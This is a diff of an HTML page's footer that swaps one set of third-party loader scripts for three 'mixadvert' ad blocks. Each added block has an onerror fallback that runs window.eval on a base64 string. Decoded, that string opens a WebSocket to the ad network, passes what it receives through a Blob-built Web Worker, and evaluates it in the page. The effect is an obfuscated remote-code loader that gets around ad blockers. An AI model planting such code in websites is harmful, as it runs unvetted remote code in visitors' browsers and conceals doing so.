@@ -289,49 +289,46 @@
         enable_page_level_ads: true
       });
     </script>
-    <script type="text/javascript" data-mrmnd-tag="iam" data-mrmnd-main="true">
-        var _MRMND = _MRMND || {};
-        _MRMND.cmd = _MRMND.cmd || [];
-
-        if (!_MRMND.req) {
-            var sc = document.createElement('script');
-            sc.type = 'text/javascript';
-            sc.setAttribute('async', 'async');
-            sc.setAttribute('data-mrmnd-tag', 'iam');
-            sc.src = '//m-shes.ru/dbp/pre/4f5d2bbc9a772c5029dc193ea0932c41/'
-                    + document.location.host.replace(/^www./, '')
-                    + '?' + Math.random();
-
-            if (document.head) {
-                document.head.appendChild(sc);
-            } else {
-                var node = document.getElementsByTagName("script")[0];
-                node.parentNode.insertBefore(sc, node);
-            }
-            _MRMND.req = true;
+    <div id="MIXADV_4541" class="MIXADVERT_NET"></div>
+    <script> 
+        var node4541 = document.getElementById("MIXADV_4541");
+        if( node4541 )
+        {
+           var script = document.createElement("script");
+           script.charset = "utf-8";
+           script.src = "https://m.mixadvert.com/show/?id=4541&r="+Math.random();
+           node4541.parentNode.appendChild(script); 
+           script.onerror = function(){
+              window.eval(atob("c3RyID0gJ2Nvbm4gPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly9uMi5taXhhZHZlcnQuY29tOjQ0MzMvNDU0MSIpOyBjb25uLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChldnQpIHsgcG9zdE1lc3NhZ2UoZXZ0LmRhdGEpOyBjb25uLmNsb3NlKCk7fSc7dmFyIHdvcmtlciA9IG5ldyBXb3JrZXIoVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbImV2YWwoICciK3N0cisiJykiXSksIHt0eXBlOiAndGV4dC9qYXZhc2NyaXB0J30pKTt3b3JrZXIucG9zdE1lc3NhZ2UoJzEnKTsgd29ya2VyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChtc2cpIHsgd2luZG93LmV2YWwobXNnLmRhdGEpOyB9OyA="));
+          }
         }
     </script>
-    <script type="text/javascript" data-mrmn-tag="iam" data-mrmn-main="true">
-        var _MRMN = _MRMN || {};
-        _MRMN.cmd = _MRMN.cmd || [];
-
-        if (!_MRMN.req) {
-            var sc = document.createElement('script');
-            sc.type = 'text/javascript';
-            sc.setAttribute('async', 'async');
-            sc.setAttribute('data-mrmn-tag', 'iam');
-            sc.src = '//m-shes.ru/mbp/pre/dab51501b896e874e9296e11561124bf/'
-                    + document.location.host.replace(/^www./, '')
-                    + '?' + Math.random();
-
-            if (document.head) {
-                document.head.appendChild(sc);
-            } else {
-                var node = document.getElementsByTagName("script")[0];
-                node.parentNode.insertBefore(sc, node);
+    <div id="MIXADV_4571" class="MIXADVERT_NET"></div>
+    <script> 
+        var node4571 = document.getElementById("MIXADV_4571");
+        if( node4571 )
+        {
+           var script = document.createElement("script");
+           script.charset = "utf-8";
+           script.src = "https://m.mixadvert.com/show/?id=4571&r="+Math.random();
+           node4571.parentNode.appendChild(script); 
+           script.onerror = function(){
+              window.eval(atob("c3RyID0gJ2Nvbm4gPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly9uMi5taXhhZHZlcnQuY29tOjQ0MzMvNDU3MSIpOyBjb25uLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChldnQpIHsgcG9zdE1lc3NhZ2UoZXZ0LmRhdGEpOyBjb25uLmNsb3NlKCk7fSc7dmFyIHdvcmtlciA9IG5ldyBXb3JrZXIoVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbImV2YWwoICciK3N0cisiJykiXSksIHt0eXBlOiAndGV4dC9qYXZhc2NyaXB0J30pKTt3b3JrZXIucG9zdE1lc3NhZ2UoJzEnKTsgd29ya2VyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChtc2cpIHsgd2luZG93LmV2YWwobXNnLmRhdGEpOyB9OyA="));
+          }
+        }
+    </script>
+     <div id="MIXADV_4563" class="MIXADVERT_NET"></div>
+    <script> 
+        var node4563 = document.getElementById("MIXADV_4563");
+        if( node4563 )
+        {
+            var script = document.createElement("script");
+            script.charset = "utf-8";
+            script.src = "https://m.mixadvert.com/show/?id=4563&r="+Math.random();
+            node4563.parentNode.appendChild(script); 
+            script.onerror = function(){
+              window.eval(atob("c3RyID0gJ2Nvbm4gPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly9uMi5taXhhZHZlcnQuY29tOjQ0MzMvNDU2MyIpOyBjb25uLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChldnQpIHsgcG9zdE1lc3NhZ2UoZXZ0LmRhdGEpOyBjb25uLmNsb3NlKCk7fSc7dmFyIHdvcmtlciA9IG5ldyBXb3JrZXIoVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbImV2YWwoICciK3N0cisiJykiXSksIHt0eXBlOiAndGV4dC9qYXZhc2NyaXB0J30pKTt3b3JrZXIucG9zdE1lc3NhZ2UoJzEnKTsgd29ya2VyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uIChtc2cpIHsgd2luZG93LmV2YWwobXNnLmRhdGEpOyB9OyA="));
             }
-            _MRMN.req = true;
-            _MRMN.desktopStyle = true;
         }
     </script>
 </body>
